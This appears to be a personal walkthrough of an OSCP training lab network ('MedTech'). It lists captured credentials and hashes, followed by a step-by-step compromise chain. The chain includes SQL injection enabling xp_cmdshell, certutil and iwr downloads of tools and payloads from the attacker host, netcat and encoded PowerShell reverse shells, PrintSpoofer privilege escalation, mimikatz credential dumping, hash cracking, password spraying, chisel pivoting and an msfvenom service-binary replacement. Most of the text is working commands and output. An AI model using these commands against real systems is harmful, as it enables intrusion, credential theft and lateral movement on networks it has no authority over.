
## Credentials
Aministrator
administrator.MEDTECH
joe:  NTLM hash - 08d7a47a6f9f66b97b1bae4178747494:Flowers1
offsec: lab
SQLServer2005SQLBrowserUser$WEB02
wario:Mushroom!
yoshi
daisy: 
toad
Guest
leon:rabbit:)
web01: offsec/century62hisan51

#### Users
Administrator
joe
offsec
wario
yoshi
daisy
toad
Guest
leon
mario
peach
krbtgt
leon
## Passwords
Flowers1
lab
Mushroom\!
rabbit!
century62hisan51
password 
## Computer and server names
120 - Web01
121 - Web02
10 - DC01
11 - Files02
12 - Dev04
82 - Client01
83 - Client02
13 - prod01

#### Pathways
121 > 11 > 83 > 82 >10 > 120 > 122 > 14 > 12 > 13
## 192.168.226.120
1. Nmap 
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ sudo nmap -A -T4 192.168.226.120                  
sudo: unable to resolve host kali: Name or service not known
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 05:47 EST
Nmap scan report for 192.168.226.120
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
|_http-title: PAW! (PWK Awesome Website)
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/12%OT=22%CT=1%CU=39092%PV=Y%DS=4%DC=T%G=Y%TM=65C9
OS:F761%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(S
OS:P=100%GCD=1%ISR=10B%TI=Z%II=I%TS=C)SEQ(SP=101%GCD=1%ISR=10B%TI=Z%TS=A)SE
OS:Q(SP=101%GCD=1%ISR=10B%TI=Z%II=I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%
OS:O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=6720%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   353.16 ms 192.168.45.1
2   352.66 ms 192.168.45.254
3   424.05 ms 192.168.251.1
4   424.90 ms 192.168.226.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.06 seconds
```

2. Gobuster 
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.226.120/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                             
 (_||| _) (/_(_|| (_| )                                                      
                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/OSCP/labs/medtech/reports/http_192.168.226.120/__24-02-12_05-52-36.txt

Target: http://192.168.226.120/

[05:52:36] Starting:                                                         
[05:53:38] 200 -    4KB - /404                                              
[05:53:38] 200 -    4KB - /404.html                                         
[05:53:48] 301 -   44B  - /about  ->  http://192.168.226.120/about/         
[05:55:00] 200 -    1KB - /assets/                                          
[05:55:00] 301 -   46B  - /assets  ->  http://192.168.226.120/assets/
[05:57:52] 200 -   36B  - /robots.txt                                       
[05:58:08] 200 -  503B  - /sitemap.xml                                      
[05:58:15] 301 -   46B  - /static  ->  http://192.168.226.120/static/

Task Completed  
```

3. Checkout all possible ports, No attack surface found. 


4. After compromising DC01, use obtained credentials for ssh
```
1. Verify creds
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ hydra -l offsec -p century62hisan51 -s 22 ssh://192.168.208.120 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-13 21:57:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://192.168.208.120:22/
[22][ssh] host: 192.168.208.120   login: offsec   password: century62hisan51
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-13 21:57:57



2. Ssh login 
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ ssh offsec@192.168.208.120   
The authenticity of host '192.168.208.120 (192.168.208.120)' can't be established.
ED25519 key fingerprint is SHA256:eCn6eNbHBenuePzdLNZ1/rbL9F5gRgqdZZpYOkszucA.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:31: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.208.120' (ED25519) to the list of known hosts.
offsec@192.168.208.120's password: 
Linux WEB01 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec  1 02:15:01 2022
offsec@WEB01:~$ whoami
offsec

```

4. Upgrade to root. 
```
offsec@WEB01:~$ su -
Password: 
root@WEB01:~#
```

5. Obatained proof
```
root@WEB01:~# cat proof.txt
c04a5a09d8e55ff81b26e33905517e24
```


## 192.168.226.121
1. Rustscan
```
──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ rustscan 192.168.226.121
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.226.121:80
Open 192.168.226.121:135
Open 192.168.226.121:139
Open 192.168.226.121:445
Open 192.168.226.121:5985
Open 192.168.226.121:47001
Open 192.168.226.121:49664
Open 192.168.226.121:49665
Open 192.168.226.121:49666
Open 192.168.226.121:49667
Open 192.168.226.121:49669
Open 192.168.226.121:49668
Open 192.168.226.121:49670
Open 192.168.226.121:49671
```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ nmap -p$(cat 121-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.226.121

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 06:51 EST
Nmap scan report for 192.168.226.121
Host is up (0.39s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MedTech
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-12T11:52:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.17 seconds
```

3. Found webpage at 80. Directory search
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ gobuster dir -u http://192.168.226.121/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.226.121/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 153] [--> http://192.168.226.121/assets/]
/css                  (Status: 301) [Size: 150] [--> http://192.168.226.121/css/]
/js                   (Status: 301) [Size: 149] [--> http://192.168.226.121/js/]
/master               (Status: 301) [Size: 153] [--> http://192.168.226.121/master/]
/fonts                (Status: 301) [Size: 152] [--> http://192.168.226.121/fonts/]
/Assets               (Status: 301) [Size: 153] [--> http://192.168.226.121/Assets/]
/Fonts                (Status: 301) [Size: 152] [--> http://192.168.226.121/Fonts/]
/*checkout*           (Status: 400) [Size: 3490]
/CSS                  (Status: 301) [Size: 150] [--> http://192.168.226.121/CSS/]
/JS                   (Status: 301) [Size: 149] [--> http://192.168.226.121/JS/]
/*docroot*            (Status: 400) [Size: 3490]
/*                    (Status: 400) [Size: 3490]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3490]
/Master               (Status: 301) [Size: 153] [--> http://192.168.226.121/Master/]
/q%26a                (Status: 400) [Size: 3490]
/http%3A              (Status: 400) [Size: 3490]
/**http%3a            (Status: 400) [Size: 3490]
/MASTER               (Status: 301) [Size: 153] [--> http://192.168.226.121/MASTER/]
/*http%3A             (Status: 400) [Size: 3490]
/**http%3A            (Status: 400) [Size: 3490]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3490]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3490]

```

4. Found login.aspx sql vulnerable at username, pefromed cmd execution
```
Enter followign commands one by one on vulnerbable place. 
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--

Then you can try with nc64.exe as follows:

';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.242/nc64.exe c:/windows/temp/nc64.exe";--
';EXEC xp_cmdshell "c:\windows\temp\nc64.exe 192.168.45.242 4444 -e cmd.exe";--
```

5. Obtained reverse shell. 
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ sudo nc -nvlp 4444                                                                    
sudo: unable to resolve host kali: Name or service not known
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.226.121] 50518
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

6. Figure out current user privileges
```
whoami /priv

found out 

SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

7. Upload printspoofer64.exe for priviledge escalation and execute it. 
```
PS C:\TEMP> iwr -uri http://192.168.45.242/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
iwr -uri http://192.168.45.242/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
PS C:\TEMP> dir
dir


    Directory: C:\TEMP


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         2/12/2024   6:26 AM          27136 PrintSpoofer64.exe                                                   


PS C:\TEMP> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

8. Find out proof.txt
```
PS C:\Users\Administrator\Desktop> cat proof.txt
cat proof.txt
f1184501a17ebcab1cc1e49760de5068
```

9. Check hash for user by uploading mimikatz.exe. Figured out user joe hash
```
PS C:\Tools> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 6/14/2023 8:11:57 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494

```

10. Crack joe ntlm hash, at the same way crack for offsec user as well. 
```
li㉿kali)-[~/OSCP/labs/medtech]
└─$ hashcat -m 1000 joe.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show
08d7a47a6f9f66b97b1bae4178747494:Flowers1
```

11. Sprayed joe user credentials to find out where it exits. 
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ crackmapexec smb ip -u joe -p 'Flowers1' --continue-on-success
SMB         192.168.226.121 445    WEB02            [*] Windows 10.0 Build 20348 x64 (name:WEB02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         192.168.226.121 445    WEB02            [+] medtech.com\joe:Flowers1 

```

12. Found out joe is user only on 121
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ crackmapexec smb ip -u joe -p 'Flowers1' -d medtech.com
SMB         192.168.226.121 445    WEB02            [*] Windows 10.0 Build 20348 x64 (name:WEB02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         192.168.226.121 445    WEB02            [+] medtech.com\joe:Flowers1 
```

13. Port forwarding using chisel
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ ./chisel_1.9.1_linux_amd64 server -p 8080 --reverse
2024/02/12 20:38:46 server: Reverse tunnelling enabled
2024/02/12 20:38:46 server: Fingerprint zOvmZN8pbgDOX5PoFbtdyBydEJ/qsYYedo7zDgPtZQw=
2024/02/12 20:38:46 server: Listening on http://0.0.0.0:8080
2024/02/12 20:40:58 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

certutil -urlcache -f http://192.168.45.242/chisel_1.9.1_windows_amd64 chisel.exe

PS C:\Tools> .\chisel.exe client 192.168.45.242:8080 R:1080:socks
.\chisel.exe client 192.168.45.242:8080 R:1080:socks
2024/02/12 17:40:56 client: Connecting to ws://192.168.45.242:8080
2024/02/12 17:41:00 client: Connected (Latency 375.1599ms)
```

14. Proxychains nmap scan
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains nmap 172.16.213.11 -sT --top-ports=20

Nmap scan report for 172.16.213.11
Host is up (3.0s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 61.09 seconds
```

15. Proxychains crackmapexec spray with joe user
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains crackmapexec smb ip -u joe -p 'Flowers1' -d medtech.com


SMB         192.168.213.121 445    WEB02            [+] medtech.com\joe:Flowers1 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.10:445  ...  OK
SMB         172.16.213.10   445    DC01             [+] medtech.com\joe:Flowers1 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.11:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.11:445  ...  OK
SMB         172.16.213.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.82:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.82:445  ...  OK
SMB         172.16.213.82   445    CLIENT01         [+] medtech.com\joe:Flowers1 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.13:445  ...  OK
SMB         172.16.213.13   445    PROD01           [+] medtech.com\joe:Flowers1 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.12:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.12:445  ...  OK
SMB         172.16.213.12   445    DEV04            [+] medtech.com\joe:Flowers1 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.83:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.83:445  ...  OK
SMB         172.16.213.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
```

16. Proxychains crackmapexec spray with lab user
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains crackmapexec smb ip -u offsec -p 'lab' -d medtech.com


SMB         172.16.213.13   445    PROD01           [+] medtech.com\offsec:lab 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.10:445  ...  OK
SMB         172.16.213.10   445    DC01             [+] medtech.com\offsec:lab 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.12:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.12:445  ...  OK
SMB         172.16.213.12   445    DEV04            [+] medtech.com\offsec:lab 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.82:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.82:445  ...  OK
SMB         172.16.213.82   445    CLIENT01         [+] medtech.com\offsec:lab 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.11:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.11:445  ...  OK
SMB         172.16.213.11   445    FILES02          [+] medtech.com\offsec:lab 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.83:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.83:445  ...  OK
SMB         172.16.213.83   445    CLIENT02         [+] medtech.com\offsec:lab 
```

## 172.16.213.11
1. Login with psexec using proxychains 
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains impacket-psexec medtech/joe:Flowers1@172.16.213.11
```

2. Found local flag in joe desktop
```
C:\Users\joe\Desktop> type local.txt
ea2cdadb40b6bfe99b067655ff77334c
```

3. Found proof flag in administrator desktop
```
C:\Users\Administrator\Desktop> type proof.txt
dd74d95e9f10f7338ce44c2023114438
```

4. Found out a log, opened it, found out three user hash, cracked for wario. 
```
PS C:\Users\joe\Documents> type fileMonitorBackup.log


┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ cat *.hash    
abf36048c1cf88f5603381c5128feb8e
8e9e1516818ce4e54247e71e71b5f436
08d7a47a6f9f66b97b1bae4178747494
2892d26cdf84d7a70e2eb3b9f05c425e
5be63a865b65349851c1f11a067a3068
fdf36048c1cf88f5630381c5e38feb8e
6085c974624ef685a86737c960a5d405
                                                                                      
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ ls *.hash          
daisy.hash  goomba.hash  joe.hash  offsec.hash  toad.hash  wario.hash  WD.hash


┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$  hashcat -m 1000 wario.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 

f36048c1cf88f5630381c5e38feb8e:Mushroom! 
```

5. Sprayed creds of wario with crackmap
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains crackmapexec smb ip -u wario -p 'Mushroom!' -d medtech.com


[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.11:445  ...  OK
SMB         172.16.213.11   445    FILES02          [+] medtech.com\wario:Mushroom! 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.10:445  ...  OK
SMB         172.16.213.10   445    DC01             [+] medtech.com\wario:Mushroom! 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.213.121:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.213.121:445  ...  OK
SMB         192.168.213.121 445    WEB02            [-] medtech.com\wario:Mushroom! STATUS_NO_LOGON_SERVERS 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.12:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.12:445  ...  OK
SMB         172.16.213.12   445    DEV04            [+] medtech.com\wario:Mushroom! 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.13:445  ...  OK
SMB         172.16.213.13   445    PROD01           [+] medtech.com\wario:Mushroom! 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.82:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.82:445  ...  OK
SMB         172.16.213.82   445    CLIENT01         [+] medtech.com\wario:Mushroom! 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.83:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.83:445  ...  OK
SMB         172.16.213.83   445    CLIENT02         [+] medtech.com\wario:Mushroom! 
```

6. Client 2 accessible from 11 so, sent reverse shell
```
C:\Users\wario> winrs -r:CLIENT02 -u:wario -p:Mushroom!  "cmd /c hostname & whoami"
CLIENT02
medtech\wario

C:\Users\wario> winrs -r:CLIENT02 -u:wario -p:Mushroom! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAyACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
BhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

## 172.16.213.83
1. Obtained reverse shell from 11 with winrs
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ sudo nc -nvlp 4443
sudo: unable to resolve host kali: Name or service not known
listening on [any] 4443 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.213.121] 63413
whoami
medtech\wario
PS C:\Users\wario> hostname
CLIENT02
```

2. Find out local.txt
```
PS C:\Users\wario\Desktop> type local.txt
974679aa6d3c0cb05da853c39d04a74b
```

3. Found out DevelopmentExecutables  is running auditTracker service. Replace it with msf payload 
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=4446 -f exe -o auditTracker.exe

certutil -urlcache -f http://192.168.45.242/auditTracker.exe auditTracker.exe

# Replace old one with new file. 
PS C:\DevelopmentExecutables> sc.exe start auditTracker
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

4. Capture reverse shell and flag. 
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ sudo nc -nvlp 4446
sudo: unable to resolve host kali: Name or service not known
[sudo] password for kali: 
listening on [any] 4446 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.213.121] 62845


C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
2c685e80ffcf023ae8fbf1adcc17520c
```

5. Found a lead of hole.txt 
```
PS C:\users\yoshi> type C:\Users\Administrator.MEDTECH\Searches\hole.txt
leon:rabbit!:)
```


## 172.16.208.10
1. Nmap result for first 20 ports
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains xfreerdp /cert-ignore /u:yoshi /d:medtech.com /p:Mushroom! /v:172.16.208.82

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   open   domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
